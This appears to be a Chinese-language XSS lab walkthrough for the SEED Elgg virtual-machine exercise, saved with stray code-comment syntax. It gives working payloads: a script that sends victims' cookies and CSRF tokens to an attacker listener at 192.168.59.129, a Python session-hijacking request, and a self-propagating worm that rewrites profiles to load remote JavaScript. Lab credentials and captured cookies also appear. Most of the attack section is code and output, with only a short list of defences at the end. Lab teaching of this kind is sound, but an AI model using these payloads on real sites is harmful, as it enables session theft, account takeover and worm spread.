// XSS从字面以上上理解，其指的是跨站脚本，是一种常见的网络攻击方式。正如其名称所述，其通过利用Web站点的代码审核漏洞，将带有逻辑性质的能够被服务器执行的脚本代码，通过网页输入端口传输到后端服务器上。
// 一旦服务器未能有效的截取这段代码，就会导致脚本代码的恶意执行，从而被黑客获取用户信息或做出一些强迫性的网页响应事件。
// 由于XSS是通过正常的网页带参请求进行脚本嵌入的，所以其攻击方式非常隐蔽，攻击成本较低，同时其危害也较大。正是由于以上特点，加之现有的各类Web网页编写弱点也不一致，黑客可以很灵活的编写不同的注入脚本程序，这为漏洞防御带来了新的困难。
// 目前主要的XSS漏洞防御策略及发展趋势如下：
// 1. 特征匹配
// 这种防御策略主要是通过检测输入数据中的关键字，例如“JavaScript”，一般的网页脚本执行的都是JavaScript代码。但是这种方式比较僵硬，有些正常的含有对应关键字的数据也会被截取。
// 2. 规范代码标准
// 这种防御策略主要从web网页编码规范的角度出发，由于不同开发者开发的网页存在部分编码差异，可能存在潜在的漏洞。通过制定一套业内标准，优化web应用，此举能减少相关漏洞的产生。
// 3. 使用端层防御策略
// 这种策略主要从浏览器的角度出发，通过收集XSS信息数据库、由用户决定是否执行服务器返回的信息内容等方式进行防范。



// XSS攻击防范
// 什么是XSS攻击

// XSS跨站脚本攻击: 黑客想尽一切方法 将一段脚本内容放到目标网站的目标浏览器上解释执行!!
// 入门可以参考我的专栏: 信息安全入门笔记中的前端黑客 - XSS入门!!
// 本次实验是进阶教程 以实验的方式一步步带你学习XSS攻击!!

// XSS攻击环境配置
// 配置浏览器

// 浏览器安装HTTP Header Live 插件!

// 部署Elgg网站

// 在我们预置的虚拟机中已经提供了Elgg网站
// 在网站中已经预置好了用户 信息如下:

// User   UserName Password
// Admin   admin    seedelgg
// Alice   alice    seedalice
// Boby    boby     seedboby
// Charlie charlie  seedcharlie
// Samy    samy     seedsamy
// 配置DNS服务器

// 由于我们需要一台预置的Ubuntu虚拟机作为Elgg服务器
// 一台Ubuntu虚拟机作为攻击者
// 因此 需要在攻击者的机器上配置DNS 以便于攻击者能访问到Elgg服务器
// 仅仅需要在 / etc / hosts文件中添加192.168.59.154 www.xsslabelgg.com

// 配置Apache服务器

// 在预置的Ubuntu虚拟机中 只需要启动Apache即可 sudo service apache2 start
// 在这里顺便提一提 如何在一台服务器上搭建多个网站 ?
//     在 / etc / apache2 / sites - available / default文件中指明域名对应的DocumentRoot路径即可

< VirtualHost *: 80 >
    ServerName www.CSRFLabCollabtive.com
DocumentRoot /var/www/CSRF / Collabtive /
</VirtualHost >

    <VirtualHost *: 80 >
        ServerName www.CSRFLabAttacker.com
DocumentRoot /var/www/CSRF / Attacker
</VirtualHost >

    <VirtualHost *: 80 >
        ServerName www.SQLLabCollabtive.com
DocumentRoot /var/www/SQL / Collabtive /
</VirtualHost >
    //     XSS入门
    // XSS显示弹框

    // 好!现在来打开你的浏览器 访问www.xsslabelgg.com 能够成功访问XSS Lab Site网站 说明配置OK!
    // 如果没能成功访问 请按照上面配置再走一遍
    // 首先 我们注册一个用户 比如说用户名: hackbiji 密码: hackbiji

    Edit profile -> Brief description -> <script>alert('hi welcome to hackbiji.top . I am ailx10 !');</script>
// 显示弹框如下:


// XSS显示Cookie

// 在自己的页面弹出自己的Cookie只需要修改alert的内容为document.cookie即可!
Edit profile -> Brief description -> <script>alert(document.cookie);</script>
// 显示自己的Cookie如下:


// XSS进阶
// XSS盗取Cooike

// 在XSS入门中 我们弹出了自己的Cookie 但是只能自己看自己的Cookie啊 攻击者如何看别人的Cookie呢 ?

//     黑客 : hackbiji Ubuntu虚拟机 ip: 192.168.59.129
// 受害者: admin 预置的Ubuntu虚拟机 ip: 192.168.59.154
// 黑客希望admin向自己发送一个GET请求 在请求中带上admin的Cookie
// hackbiji在Brief description中通过 < img > 引入一张图片
// 我们需要诱导admin访问hackbiji的首页(里面有profile信息的页面都行)

hackbiji的操作如下:

<script type="text/javascript">document.write("<img src='http://192.168.59.129:10086?c=" + escape(document.cookie) + "'>")</script>
    {/* 之后hackbiji只需要监听10086端口 等待admin访问自己的首页 */}

    {/* 结果如下 鱼儿上钩了 我们成功拿到admin的Cookie: */}

    {/* 第1个是hackbiji自己的Cookie 第2个是admin的Cookie */}

hacker@ubuntu:~/Desktop/echoserver$ ./echoserv 10086
GET /?c=Elgg%3D9suficofkh2pgo25csktof2nc5 HTTP/1.1
GET /?c=Elgg%3Dhgb32s34ekr20kdq6ttje8dct0 HTTP/1.1
{/* 鉴于篇幅有限 监听程序会在知乎Live中分析!!!
知乎Live中有 直播视频 ~

XSS会话劫持

我们想通常XSS实现会话劫持 劫持admin 添加hackbiji为好友!!!
通过HTTP Header Live插件 我们需要以下admin的一下信息:


如下再次通过监听程序我们获取Cookie ts token!!! */}

    <script type="text/javascript">document.write("<img src='http://192.168.59.129:10086?c=" + escape(document.cookie) +"&ts=" + elgg.security.token.__elgg_ts + "&token=" + elgg.security.token.__elgg_token + "'>")</script>

        {/* 通过python3构造HTTP GET请求: */}

import http.client
class XSS(object):
    def __init__(self):
        pass

    def httpGet(self,servAddr,url,xssheaders):
        try:
            conn = http.client.HTTPConnection(servAddr)
            conn.request('GET', url ,headers = xssheaders)
            print('conn:',conn)
            r1 = conn.getresponse()
            data = r1.read()
            print('data:',data)
            print(r1.status,r1.reason)
            conn.close()
        except IOError as e:
            print("except:", e)
        finally:
            print("XSS END")

if __name__ == '__main__':
    servAddr = "www.xsslabelgg.com"
    url = "/action/friends/add?friend=43"
    __elgg_ts = '&__elgg_ts='+'1528563725'
    __elgg_token = '&__elgg_token='+'f18fc16061bc06000a5ff62f4dcfccaa'
    url = url + __elgg_ts + __elgg_token
    xssheaders = {
            'Host': 'www.xsslabelgg.com',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0',
        'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-GB,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': 'http://www.xsslabelgg.com/profile/hackbiji',
        'Cookie': 'Elgg=hgb32s34ekr20kdq6ttje8dct0',
        'Connection': 'keep-alive',
    }
    hackbiji = XSS()
    print('url:',url)
    hackbiji.httpGet(servAddr,url,xssheaders)
{/* 看看是不是已经成功劫持了admin? */}
        {/* 现在的hackbiji已经成为amdin的朋友了!!! */}


        {/* XSS放肆 */}
        {/* XSS蠕虫 */}

        {/* 1.添加hackbiji为好友 */}
        {/* 2.复制self-propagating-worm.js到受害者的briefdescription */}
var hackbiji_self_worm = document.getElementById("self-propagating-worm").innerHTML;
alert(hackbiji_self_worm);
var user = elgg.session.user.username;
if(user!='hackbiji'){
    var victim = null;
    victim = new XMLHttpRequest();
    victim.open("GET","http://www.xsslabelgg.com/action/friends/add?friend="+"43"+"&__elgg_ts="+elgg.security.token.__elgg_ts+"&__elgg_token="+elgg.security.token.__elgg_token,true);
    victim.setRequestHeader("Host","www.xsslabelgg.com");
    victim.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0");
    victim.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    victim.setRequestHeader("Accept-Language","en-US,en;q=0.5");
    victim.setRequestHeader("Accept-Encoding","gzip, deflate");
    victim.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/"+user);
    victim.setRequestHeader("Cookie",document.cookie);
    victim.setRequestHeader("Connection","keep-alive");
    victim.send();

    victim = null;
    victim = new XMLHttpRequest();
    victim.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
    victim.setRequestHeader("Host","www.xsslabelgg.com");
    victim.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0");
    victim.setRequestHeader("Accept-Language","en-US,en;q=0.5");
    victim.setRequestHeader("Accept-Encoding","gzip, deflate");
    victim.setRequestHeader("Cookie",document.cookie);
    victim.setRequestHeader("Connection","keep-alive");
    victim.setRequestHeader("Content-Type","application/x-www-form-urlencoded");

    var content="__elgg_token=".concat(elgg.security.token.__elgg_token);
    content = content.concat("&__elgg_ts=").concat(elgg.security.token.__elgg_ts);
    content = content.concat("&name=").concat(user);
    content = content.concat("&&briefdescription=<script id='self-propagating-worm' type='text\/javascript' src='https:\/\/raw.githubusercontent.com\/isGt93\/Keep-learning\/master\/mySeedLab\/XSS\/self-propagating-worm.js'><\/script>");
    content = content.concat("&guid=").concat(elgg.session.user.guid);

    victim.setRequestHeader("Content-Length",content.length);
    victim.send(content);
}
{/* 来看看!!是不是谁访问hackbiji的首页 谁就会被感染成为hackbiji的好友!!!

再看看admin 的 Brief description 是不是也变成和 hackbiji 一样的了~~~


XSS防御方案
通过以上实验 我们得出防御XSS攻击的有效方式是对输入进行过滤!!!
有效方式有如下:

部署WAF Web 应用层防火墙
过滤所有HTTML JS CSS标签
过滤异常字符编码 */}






















